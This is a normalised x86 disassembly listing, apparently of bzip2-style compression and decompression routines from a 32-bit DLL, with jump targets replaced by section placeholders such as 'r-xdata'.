cmp eax ebx
je r-xdata
push esi
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
jmp r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
push ecx
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
mov [ esi + 0x26c ] ebx
mov [ esi + 0x264 ] ebx
mov [ esi + 0x270 ] 0x9
mov [ esi + 0x48 ] 0xdbb8d
mov [ esi + 0x268 ] ebx
mov [ esi + 0x30 ] 0x1e
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x20 ] ecx
push 0x2
pop eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ edi + 0x20 ] esi
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ esi + 0x34 ] 0x100
mov [ esi + 0x38 ] ebx
call sub_10019747
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_100198ba
mov cl [ eax + 0x34 ]
push esi
xor esi esi
cmp [ eax + 0x38 ] esi
push edi
jle r-xdata
mov edx [ eax + 0x34 ]
mov [ eax + edx + 0x58 ] 0x1
mov edx [ eax + 0x38 ]
mov esi edx
dec esi
je r-xdata
movzx edi cl
push ebx
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
dec esi
je r-xdata
mov edx [ eax + 0x260 ]
mov ebx edx
shr ebx 0x18
xor ebx edi
shl edx 0x8
xor edx [ ebx * 4 + rw-data ]
inc esi
mov [ eax + 0x260 ] edx
cmp esi [ eax + 0x38 ]
jl r-xdata
pop ebx
mov edi [ eax + 0x24 ]
lea edx [ eax + 0x44 ]
mov esi [ edx ]
mov [ esi + edi ] cl
inc [ edx ]
mov esi [ edx ]
mov eax [ eax + 0x24 ]
mov [ esi + eax ] cl
inc [ edx ]
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
jmp r-xdata
mov [ edx + eax + 0x54 ] 0x1
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov dl [ eax + 0x38 ]
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
sub dl 0x4
mov [ ecx + esi ] dl
jmp r-xdata
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
sub_10019996
push ebp
mov ebp esp
push ecx
push ecx
cmp [ esi + 0x4 ] 0x2
mov eax [ esi + 0x44 ]
push ebx
push edi
mov [ ebp - 0x1 ] 0x0
jne r-xdata
cmp eax [ esi + 0x48 ]
jl r-xdata
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_100198ba
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_100198ba
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ esi + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
sub_10019b32
push ecx
push ebx
push ebp
push esi
mov esi [ eax + 0x20 ]
xor ebx ebx
push edi
mov [ esp + 0x12 ] bl
mov [ esp + 0x13 ] bl
cmp [ esi + 0x8 ] 0x2
jne r-xdata
xor cl cl
jmp r-xdata
xor edi edi
inc edi
cmp [ esi + 0x8 ] edi
jne r-xdata
call sub_10019996
or [ esp + 0x12 ] al
cmp [ esi + 0x4 ] 0x2
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ esi + 0x44 ]
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jge r-xdata
mov eax [ esi + 0x50 ]
or [ esp + 0x13 ] cl
cmp eax [ esi + 0x4c ]
jl r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
push ebx
mov ebp 0x100
cmp [ esi + 0x34 ] ebp
jae r-xdata
mov edx [ esi + 0x2c ]
mov al [ eax + edx ]
mov ebp [ esi ]
mov ebp [ ebp + 0x10 ]
mov [ ebp ] al
mov eax [ esi ]
inc [ esi + 0x50 ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
mov cl 0x1
cmp [ eax + 0x18 ] ebx
jne r-xdata
cmp [ esp + 0x12 ] bl
jne r-xdata
cmp [ esi + 0x4 ] 0x4
jne r-xdata
cmp [ esi + 0x4 ] 0x4
mov [ esi + 0x34 ] ebp
sete al
movzx eax al
mov [ esi + 0x38 ] ebx
push eax
jmp r-xdata
mov eax esi
call sub_100198ba
inc [ eax + 0x1c ]
mov eax edi
cmp [ esp + 0x13 ] bl
jne r-xdata
call sub_10019747
cmp [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x2
jne r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_1001c66c
pop ecx
mov [ esi + 0x8 ] edi
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_10019772
test al al
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
call sub_10019772
test al al
jne r-xdata
sub_10019c59
push esi
test eax eax
jne r-xdata
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
mov edx [ esi ]
cmp edx eax
jne r-xdata
mov ecx [ esi + 0x4 ]
dec ecx
je r-xdata
or eax 0xffffffff
pop esi
retn
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0x4
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
retn
call sub_10019b32
test al al
je r-xdata
cmp [ esi + 0xc ] 0x0
ja r-xdata
push 0x3
jmp r-xdata
mov eax esi
call sub_10019772
test al al
je r-xdata
pop eax
pop esi
retn
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
mov [ esi + 0x4 ] 0x1
push 0x4
jmp r-xdata
sub_10019cd0
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0x18 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_10019d2c
push ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ esi + 0x24 ] ebx
jne r-xdata
push 0xfffffffe
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x24 ] sub_10019724
push 0x1
push 0xfa74
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
cmp eax ebx
jne r-xdata
mov [ esi + 0x28 ] sub_10019735
mov [ eax ] esi
mov [ esi + 0x20 ] eax
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0xc64 ] ebx
mov [ eax + 0x4 ] 0xa
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ eax + 0x28 ] bl
mov [ eax + 0xc54 ] ebx
mov [ eax + 0xc50 ] ebx
mov [ eax + 0xc4c ] ebx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
xor eax eax
pop ebx
retn
push 0xfffffffd
jmp r-xdata
pop eax
pop ebx
retn
sub_10019dab
push ebp
mov ebp esp
sub esp 0x28
cmp [ ecx + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ecx + 0xc60 ]
mov ebx [ ecx + 0xc4c ]
mov esi [ ecx + 0xc ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ecx + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx + 0x440 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edi [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] edi
mov edi [ ecx + 0x24 ]
mov [ ebp - 0x24 ] edi
mov edi [ ecx + 0xfa40 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] eax
inc edi
mov edx [ ecx ]
xor edi edi
cmp [ edx + 0x14 ] edi
je r-xdata
cmp [ ebp - 0x8 ] edi
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ecx + 0xc ] edi
je r-xdata
mov al 0x1
je r-xdata
mov eax [ ecx ]
mov edi [ eax + 0x18 ]
mov [ ebp - 0x24 ] edi
sub edi [ ebp - 0x10 ]
add edi [ ebp - 0x28 ]
mov [ eax + 0x18 ] edi
mov eax [ ecx ]
mov edi [ ebp - 0x24 ]
cmp [ eax + 0x18 ] edi
jae r-xdata
cmp esi 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx + 0xfa40 ]
mov esi [ ecx + 0x440 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp esi eax
je r-xdata
mov eax [ edx + 0x10 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
movzx ebx [ ecx + 0x8 ]
lea esi [ ecx + 0xc60 ]
mov edx [ esi ]
mov eax edx
shl edx 0x8
shr eax 0x18
xor eax ebx
xor edx [ eax * 4 + rw-data ]
dec [ ecx + 0xc ]
mov [ esi ] edx
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] edi
jne r-xdata
xor esi esi
jmp r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ecx + 0xc60 ] eax
mov al [ ebp - 0x1 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x440 ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
mov eax [ ecx ]
mov [ ecx + 0x38 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0xc ] esi
mov [ ecx + 0xc4c ] ebx
mov [ eax + 0x10 ] edx
mov eax [ ecx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
inc [ eax + 0x1c ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ ebx ] al
mov ebx [ ebp - 0x14 ]
movzx eax al
shr ebx 0x18
xor ebx eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
dec esi
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jg r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx eax al
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] eax
je r-xdata
xor esi esi
inc esi
mov esi [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ esi ] al
mov esi [ ebp - 0x14 ]
movzx eax al
shr esi 0x18
xor esi eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ esi * 4 + rw-data ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov al [ ecx + 0x3c ]
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x8 ] al
mov eax [ ecx + 0x24 ]
imul eax eax 0x186a0
mov [ ecx + 0xc ] 0x1
mov [ ebp - 0x1c ] eax
cmp edx eax
jae r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ebx [ ecx + 0xc4c ]
mov edx [ ebx + edx * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
cmp [ ecx + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
push 0x2
pop esi
mov [ ebp - 0x20 ] eax
cmp edx eax
jae r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
test esi esi
jle r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x2
cmp eax [ ebp - 0x1c ]
jae r-xdata
push 0x3
pop esi
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x3
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx esi al
shr edx 0x8
add esi 0x4
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov edx [ ebx + edx * 4 ]
movzx eax dl
shr edx 0x8
add [ ebp - 0x8 ] 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
je r-xdata
and [ ecx + 0x18 ] 0x0
mov eax [ ecx + 0x38 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
xor edx edx
inc esi
cmp edi 0x1
sete dl
movzx eax al
mov [ ecx + 0x440 ] esi
xor edx eax
add edx 0x4
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x38 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov eax [ ebx + edx * 4 ]
mov [ ecx + 0x38 ] eax
shr [ ecx + 0x38 ] 0x8
movzx eax al
mov [ ecx + 0x3c ] eax
test edi edi
jne r-xdata
and [ ecx + 0x18 ] 0x0
dec [ ecx + 0x14 ]
mov eax [ ecx + 0x14 ]
xor edx edx
cmp eax 0x1
sete dl
xor [ ecx + 0x3c ] edx
inc esi
mov [ ecx + 0x440 ] esi
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov edx [ eax * 4 + rw-data ]
inc eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] eax
cmp eax 0x200
jne r-xdata
and [ ecx + 0x18 ] edi
sub_1001a257
push esi
xor eax eax
mov edx 0x100
push edi
mov edx ecx
mov eax ecx
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
lea ecx [ edx + eax ]
sar ecx 0x1
cmp esi [ edi + ecx * 4 ]
jl r-xdata
pop edi
pop esi
retn
mov ecx edx
sub ecx eax
cmp ecx 0x1
jne r-xdata
sub_1001a284
push ebp
mov ebp esp
sub esp 0x10
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
xor al al
jmp r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
mov al 0x1
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x440 ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ esi + 0x440 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
